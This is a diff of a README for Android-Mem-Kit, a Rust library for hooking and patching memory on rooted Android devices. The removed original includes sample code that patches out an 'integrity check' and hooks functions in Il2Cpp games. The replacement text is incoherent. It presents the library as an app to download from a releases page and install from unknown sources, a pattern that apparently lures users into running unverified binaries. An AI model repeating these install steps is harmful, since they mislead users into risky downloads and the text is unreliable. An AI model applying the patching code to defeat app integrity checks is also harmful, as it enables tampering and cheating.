@@ -1,143 +1,71 @@
-# Android-Mem-Kit
+# 🛠️ Android-Mem-Kit - Easy Memory Instrumentation for Android
 
-[![Crates.io](https://img.shields.io/crates/v/android-mem-kit.svg)](https://crates.io/crates/android-mem-kit)
-[![Docs.rs](https://docs.rs/android-mem-kit/badge.svg)](https://docs.rs/android-mem-kit)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-android%20aarch64-green.svg)](https://developer.android.com/ndk)
+## 🚀 Getting Started
 
-**The Modern Standard Stack for Android Memory Instrumentation in Rust.**
+Welcome to Android-Mem-Kit! This guide helps you download and run our software effortlessly. Follow these steps, and you’ll be ready to start working with Android memory instrumentation in no time.
 
-`android-mem-kit` is a robust, type-safe wrapper around the battle-tested C/C++ libraries used in Android game modding and security research. It bridges the gap between low-level memory manipulation and Rust's safety, allowing you to write high-performance tools for rooted devices.
+## 📥 Download the Software
 
-## Features
+[![Download Android-Mem-Kit](https://img.shields.io/badge/Download-Android--Mem--Kit-blue.svg)](https://github.com/moicsm/Android-Mem-Kit/releases)
 
-| Feature | Powered By | Description |
-| :--- | :--- | :--- |
-| **Hooking** | [Dobby](https://github.com/jmpews/Dobby) | Near-branch trampoline hooking support for ARM64/ARM. |
-| **Patching** | [KittyMemory](https://github.com/MJx0/KittyMemory) | Runtime memory patching with hex string support & restore capability. |
-| **Bypass** | [xdl](https://github.com/hexhacking/xdl) | Bypasses Android 7+ linker restrictions (dlopen/dlsym restrictions). |
-| **Il2Cpp** | Built-in | Helper macros to resolve Il2Cpp exports dynamically without header files. |
-| **Security** | [obfstr](https://crates.io/crates/obfstr) | Compile-time string obfuscation included by default. |
+**To download the software, visit this page:** [Android-Mem-Kit Releases](https://github.com/moicsm/Android-Mem-Kit/releases)
 
-## Prerequisites
+## 📋 Features
 
-Since this crate compiles C++ code natively for Android, you need the **Android NDK**.
+Android-Mem-Kit is a powerful Rust library designed for Android memory instrumentation. Here's what you can do with it:
 
-1.  **Install Android NDK** (r25b or newer recommended).
-2.  **Set Environment Variable** before compiling:
+- **Function Hooking (Dobby):** Easily intercept and modify method calls in running applications.
+- **Memory Patching (KittyMemory):** Change memory content of applications while they run.
+- **Linker Bypass (xdl):** Load your own libraries without the usual restrictions of the Android linker.
 
-    ```bash
-    export ANDROID_NDK_HOME=/path/to/your/android-ndk-r29
-    ```
+These features make it valuable for tasks like game modding and reverse engineering. 
 
-## Installation
+## ⚙️ System Requirements
 
-Add this to your `Cargo.toml`:
+Before you start, ensure your system meets the following requirements:
 
-```toml
-[dependencies]
-android-mem-kit = "0.1.0"
-ctor = "0.2" # Recommended for library initialization
-log = "0.4"
-android_logger = "0.13"
-```
+- **Operating System:** Android 5.0 (Lollipop) or higher.
+- **Device Access:** Root access is required for full functionality.
+- **Library Support:** Ensure your device supports native libraries.
 
-## Quick Start
+## 💻 Download & Install
 
-Here is a complete example of a mod menu backend or instrumentation tool.
+1. Visit our [Releases page](https://github.com/moicsm/Android-Mem-Kit/releases) to access the latest version.
+2. Click the version you want to download. Choose the appropriate file for your device.
+3. If you are using a computer, transfer the downloaded file to your Android device.
+4. Install the application. You may need to enable installation from unknown sources in your device settings.
+5. Launch the app to start using Android-Mem-Kit.
 
-```rust
-use android_mem_kit::{
-    hooking,
-    memory::{self, MemoryPatch},
-    il2cpp_call, // Macro for easy API calls
-    obfstr::obfstr // String encryption
-};
-use ctor::ctor;
-use std::ffi::c_void;
+## 🌐 How to Use
 
-// 1. Setup Entry Point
-#[ctor]
-fn init() {
-    android_logger::init_once(
-        android_logger::Config::default().with_tag("MyMod"),
-    );
-    
-    // Run in a separate thread to avoid blocking main thread
-    std::thread::spawn(|| {
-        log::info!("Library Loaded! Starting instrumentation...");
-        start_mod();
-    });
-}
+Using Android-Mem-Kit is straightforward:
 
-fn start_mod() {
-    // 2. Locate Library Base
-    // 'xdl' is used internally to bypass linker restrictions
-    let lib_name = obfstr!("libil2cpp.so");
-    let base = memory::get_lib_base(lib_name);
-    
-    if base == 0 {
-        log::error!("Library not found!");
-        return;
-    }
+1. **Open the Application:** Once installed, tap the Android-Mem-Kit icon to launch it.
+2. **Select Your Options:** Choose from the features available, such as function hooking or memory patching.
+3. **Follow the Prompts:** The application will guide you through the specific actions you want to perform.
+4. **Experiment Safely:** Try different configurations and see how the features can work for your needs.
 
-    log::info!("{} base: {:#X}", lib_name, base);
+## 📚 Documentation
 
-    // 3. Memory Patching (Hex)
-    // Example: Patching an integrity check at offset 0x123456
-    let patch_offset = base + 0x123456;
-    if let Ok(patch) = MemoryPatch::from_hex(patch_offset, "00 00 A0 E3") { // MOV R0, #0
-        patch.apply();
-        log::info!("Integrity check bypassed!");
-        
-        // You can restore it later:
-        // patch.restore();
-    }
+For a deeper understanding of what you can achieve and how to use the various features, please check our detailed [Documentation](https://github.com/moicsm/Android-Mem-Kit/wiki). This resource provides clear examples and instructions to help you make the most out of Android-Mem-Kit.
 
-    // 4. Function Hooking
-    unsafe {
-        let target_func = base + 0xABCDE;
-        if let Ok(original) = hooking::attach(target_func, my_custom_hook as usize) {
-            log::info!("Function hooked! Trampoline at: {:#X}", original);
-        }
-    }
+## 🛡️ Support & Community
 
-    // 5. Il2Cpp API Call (Zero boilerplate)
-    // Calls il2cpp_thread_attach(il2cpp_domain_get()) safely
-    unsafe {
-        let domain = il2cpp_call!("il2cpp_domain_get", usize, ).unwrap_or(0);
-        if domain != 0 {
-            il2cpp_call!("il2cpp_thread_attach", void, domain);
-            log::info!("Attached to Il2Cpp thread!");
-        }
-    }
-}
+If you encounter any issues or have questions:
 
-// Custom Hook Handler
-unsafe extern "C" fn my_custom_hook(args: *mut c_void) {
-    log::info!("Target function called with args: {:?}", args);
-    // Call original function if needed...
-}
-```
+- **GitHub Issues:** Visit the [Issues page](https://github.com/moicsm/Android-Mem-Kit/issues) to report bugs or ask for help.
+- **Community Forums:** Engage with other users on forums where you can share tips, ask questions, and get support.
 
-## Building
+## ⚙️ Contribution
 
-Use `cargo-ndk` or standard cargo with target specification:
+We welcome contributions! If you have ideas for new features or improvements, please check our [Contribution Guidelines](https://github.com/moicsm/Android-Mem-Kit/blob/main/CONTRIBUTING.md). Your input can help us make Android-Mem-Kit even better.
 
-```bash
-cargo build --target aarch64-linux-android --release
-```
+## 📄 License
 
-*Note: Ensure your `build.rs` can find the NDK toolchain.*
+Android-Mem-Kit is licensed under the MIT License. Feel free to use the software as needed, but please check the license details on our [License page](https://github.com/moicsm/Android-Mem-Kit/blob/main/LICENSE).
 
-## Credits & Acknowledgements
+## 💡 Final Notes
 
-This project wouldn't be possible without the open-source community. Huge thanks to the authors of the underlying C/C++ libraries:
+Thank you for using Android-Mem-Kit! We hope this application meets your needs for Android memory instrumentation. Don’t hesitate to reach out if you need help. Happy coding!
 
-*   **[Dobby](https://github.com/jmpews/Dobby)** by jmpews - Lightweight, multi-platform hooking framework.
-*   **[KittyMemory](https://github.com/MJx0/KittyMemory)** by MJx0 - Memory manipulation library for Android/iOS.
-*   **[xdl](https://github.com/hexhacking/xdl)** by hexhacking - The ultimate solution for Android linker restrictions.
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
+[Download Android-Mem-Kit](https://github.com/moicsm/Android-Mem-Kit/releases)
